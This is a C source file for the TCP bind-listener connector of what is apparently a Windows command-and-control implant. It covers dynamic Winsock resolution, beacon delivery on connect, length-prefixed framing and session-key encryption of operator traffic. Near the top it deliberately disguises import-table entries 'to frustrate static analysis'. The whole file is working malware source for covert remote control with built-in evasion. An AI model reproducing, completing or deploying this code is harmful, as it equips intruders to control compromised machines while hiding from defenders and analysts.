#include "ConnectorTCP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Crypt.h"
#include "utils.h"
#include "Agent.h"
#include "IatDisguise.h"
#include "DynamicPolymorphism.h"

extern Agent* g_Agent;

BOOL ConnectorTCP_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize);
void ConnectorTCP_SendData(Connector* self, BYTE* data_buf, ULONG data_size);
BYTE* ConnectorTCP_RecvData(Connector* self);
int ConnectorTCP_RecvSize(Connector* self);
void ConnectorTCP_RecvClear(Connector* self);
void ConnectorTCP_Listen(Connector* self);
BOOL ConnectorTCP_WaitForConnection(Connector* self);
BOOL ConnectorTCP_IsConnected(Connector* self);
void ConnectorTCP_DisconnectInternal(Connector* self);
void ConnectorTCP_Disconnect(Connector* self);
void ConnectorTCP_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey);
void ConnectorTCP_CloseConnector(Connector* self);

Connector* CreateConnectorTCP()
{
    Connector* conn = (Connector*)MemAllocLocal(sizeof(Connector));
    ConnectorTCPData* data = (ConnectorTCPData*)MemAllocLocal(sizeof(ConnectorTCPData));
    conn->instanceData = data;

    data->functions = (TCPFUNC*)ApiWin->LocalAlloc(LPTR, sizeof(TCPFUNC));

    data->functions->LocalAlloc   = ApiWin->LocalAlloc;
    data->functions->LocalReAlloc = ApiWin->LocalReAlloc;
    data->functions->LocalFree    = ApiWin->LocalFree;
    data->functions->LoadLibraryA = ApiWin->LoadLibraryA;
    data->functions->GetLastError = ApiWin->GetLastError;
    data->functions->GetTickCount = ApiWin->GetTickCount;

	data->functions->WSAStartup		 = ApiWin->WSAStartup;
	data->functions->WSACleanup		 = ApiWin->WSACleanup;
	data->functions->socket			 = ApiWin->socket;
	data->functions->ioctlsocket	 = ApiWin->ioctlsocket;
	data->functions->WSAGetLastError = ApiWin->WSAGetLastError;
	data->functions->closesocket	 = ApiWin->closesocket;
	data->functions->listen			 = ApiWin->listen;
	data->functions->bind			 = ApiWin->bind;
	data->functions->select			 = ApiWin->select;
	data->functions->accept		     = ApiWin->accept;
	data->functions->__WSAFDIsSet	 = ApiWin->__WSAFDIsSet;
	data->functions->send		     = ApiWin->send;
	data->functions->recv		     = ApiWin->recv;
	data->functions->shutdown		 = ApiWin->shutdown;

	// Disguise IAT entries to frustrate static analysis
	IatDisguise_Init();
	AX_SPOOF_CONNECTOR_JUNK();

    conn->SetProfile = ConnectorTCP_SetProfile;
    conn->WaitForConnection = ConnectorTCP_WaitForConnection;
    conn->IsConnected = ConnectorTCP_IsConnected;
    conn->Disconnect = ConnectorTCP_Disconnect;
    conn->Exchange = ConnectorTCP_Exchange;
    conn->RecvData = ConnectorTCP_RecvData;
    conn->RecvSize = ConnectorTCP_RecvSize;
    conn->RecvClear = ConnectorTCP_RecvClear;
    conn->Sleep = Connector_DefaultSleep;
    conn->CloseConnector = ConnectorTCP_CloseConnector;

    return conn;
}

BOOL ConnectorTCP_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, ULONG beatDataSize)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
	ProfileTCP profile = *(ProfileTCP*)profilePtr;

	if (beatData && beatDataSize) {
		data->beat = (BYTE*)MemAllocLocal(beatDataSize);
		if (data->beat) {
			memcpy(data->beat, beatData, beatDataSize);
			data->beatSize = beatDataSize;
		}
	}
	data->port = profile.port;

	WSAData WSAData;
	if (data->functions->WSAStartup(514u, &WSAData) < 0)
		return FALSE;

	SOCKET sock = data->functions->socket(AF_INET, SOCK_STREAM, 0);
	if (sock == -1)
		return FALSE;

	struct sockaddr_in saddr = { 0 };
	saddr.sin_family = AF_INET;
	saddr.sin_port = ((data->port >> 8) & 0x00FF) | ((data->port << 8) & 0xFF00); // port

	if (data->functions->bind(sock, (struct sockaddr*)&saddr, sizeof(sockaddr)) == -1) {
		data->functions->closesocket(sock);
		return FALSE;
	}

	if (data->functions->listen(sock, 1) == -1) {
		data->functions->closesocket(sock);
		return FALSE;
	}

	data->prepend = profile.prepend;
	data->SrvSocket = sock;
	return TRUE;
}

BOOL CheckState(SOCKET sock, int timeoutMs)
{
	ULONG endTime = ApiWin->GetTickCount() + timeoutMs;
	while (ApiWin->GetTickCount() < endTime) {

		fd_set readSet;
		FD_ZERO(&readSet);
		FD_SET(sock, &readSet);
		timeval timeout = { 0, 100 };

		int selResult = ApiWin->select(0, &readSet, NULL, NULL, &timeout);
		if (selResult == 0)
			return TRUE;

		if (selResult == SOCKET_ERROR)
			return FALSE;

		char buf;
		int recvResult = ApiWin->recv(sock, &buf, 1, MSG_PEEK);
		if (recvResult == 0)
			return FALSE;

		if (recvResult < 0)
		{
			int err = ApiWin->WSAGetLastError();
			if (err == WSAEWOULDBLOCK)
				return TRUE;
		}
		else return TRUE;
	}
	return FALSE;
}

void ConnectorTCP_SendData(Connector* self, BYTE* data_buf, ULONG data_size)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    data->recvSize = 0;

    if (data_buf && data_size) {
		
		if (data->functions->send(data->ClientSocket, (const char*)&data_size, 4, 0) != -1) {
			DWORD index = 0;
			DWORD size = 0;
			DWORD NumberOfBytesWritten = 0;
			while (1) {
				size = data_size - index;
				if (data_size - index > 0x1000)
					size = 0x1000;

				NumberOfBytesWritten = data->functions->send(data->ClientSocket, (const char*)(data_buf + index), size, 0);
				if (NumberOfBytesWritten == -1)
					break;

				index += NumberOfBytesWritten;
				if (index >= data_size)
					break;
			}
		}
    }

	bool alive = false;
	ULONG endTime = data->functions->GetTickCount() + 2500;
	while (data->functions->GetTickCount() < endTime) {

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = data->ClientSocket;
		timeval timeout = { 0, 100 };

		int selResult = data->functions->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult == 0) {
			alive = true;
			break;
		}

		if (selResult == SOCKET_ERROR)
			break;

		char buf;
		int recvResult = data->functions->recv(data->ClientSocket, &buf, 1, MSG_PEEK);
		if (recvResult == 0)
			break;

		if (recvResult < 0) {
			if (data->functions->WSAGetLastError() == WSAEWOULDBLOCK) {
				alive = true;
				break;
			}
		}
		else {
			alive = true;
			break;
		}
	}

	if (!alive) {
		data->recvSize = -1;
		return;
	}

    DWORD totalBytesAvail = 0;
	int result = data->functions->ioctlsocket(data->ClientSocket, FIONREAD, &totalBytesAvail);
    if (result != -1 && totalBytesAvail >= 4) {

        ULONG dataLength = 0;
		if (data->functions->recv(data->ClientSocket, (PCHAR)&dataLength, 4, 0) != -1 && dataLength) {
            if (dataLength > data->allocaSize) {
                data->recvData   = (BYTE*)data->functions->LocalReAlloc(data->recvData, dataLength, 0);
                data->allocaSize = dataLength;
            }

            ULONG index = 0;
			int NumberOfBytesRead = 0;
			while ((NumberOfBytesRead = data->functions->recv(data->ClientSocket, (PCHAR)data->recvData + index, dataLength - index, 0)) && NumberOfBytesRead != -1) {
                index += NumberOfBytesRead;

                if (index > dataLength) {
                    data->recvSize = -1;
                    return;
                }

                if (index == dataLength)
                    break;
			}
            data->recvSize = index;
		}
    }
}

BYTE* ConnectorTCP_RecvData(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    return data->recvData;
}

int ConnectorTCP_RecvSize(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    return data->recvSize;
}

void ConnectorTCP_RecvClear(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
	if (data->recvData && data->allocaSize) {
		if (data->recvSize > 0)
			memset(data->recvData, 0, data->recvSize);
		else 
			memset(data->recvData, 0, data->allocaSize);
	}
}

void ConnectorTCP_Listen(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
	fd_set readfds;
	readfds.fd_count = 1;
	readfds.fd_array[0] = data->SrvSocket;

	while (1) {
		int sel = data->functions->select(0, &readfds, 0, 0, NULL);
		if (sel > 0 && readfds.fd_array[0] == data->SrvSocket) {
			SOCKET clientSock = data->functions->accept(data->SrvSocket, 0, 0);
			if (clientSock != -1) {
				data->ClientSocket = clientSock;
				break;
			}
		}
	}

    data->recvData = (BYTE*)data->functions->LocalAlloc(LPTR, 0x100000);
    data->allocaSize = 0x100000;
}

BOOL ConnectorTCP_WaitForConnection(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    ConnectorTCP_Listen(self);
    ConnectorTCP_SendData(self, data->beat, data->beatSize);
    data->connected = TRUE;
    return TRUE;
}

BOOL ConnectorTCP_IsConnected(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    return data->connected;
}

void ConnectorTCP_DisconnectInternal(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    if (data->allocaSize && data->recvData) {
        memset(data->recvData, 0, data->allocaSize);
        data->functions->LocalFree(data->recvData);
        data->recvData = NULL;
    }

    data->allocaSize = 0;
    data->recvData = 0;
	data->functions->shutdown(data->ClientSocket, 2);
	data->functions->closesocket(data->ClientSocket);
}

void ConnectorTCP_Disconnect(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    ConnectorTCP_DisconnectInternal(self);
    data->connected = FALSE;
}

void ConnectorTCP_Exchange(Connector* self, BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
    if (plainData && plainSize > 0) {
        EncryptSessionTransport(plainData, plainSize, sessionKey, g_Agent->config->transport_salt);
        ConnectorTCP_SendData(self, plainData, plainSize);
    }
    else {
        ConnectorTCP_SendData(self, NULL, 0);
    }

    if (data->recvSize < 0) {
        data->connected = FALSE;
        return;
    }

    if (data->recvSize > 0 && data->recvData) {
        DecryptSessionTransport(data->recvData, data->recvSize, sessionKey, g_Agent->config->transport_salt);
    }
}

void ConnectorTCP_CloseConnector(Connector* self)
{
	ConnectorTCPData* data = (ConnectorTCPData*)self->instanceData;
	if (data->beat && data->beatSize) {
		MemFreeLocal((LPVOID*)&data->beat, data->beatSize);
		data->beat = NULL;
		data->beatSize = 0;
	}
	data->functions->shutdown(data->SrvSocket, 2);
	data->functions->closesocket(data->SrvSocket);
}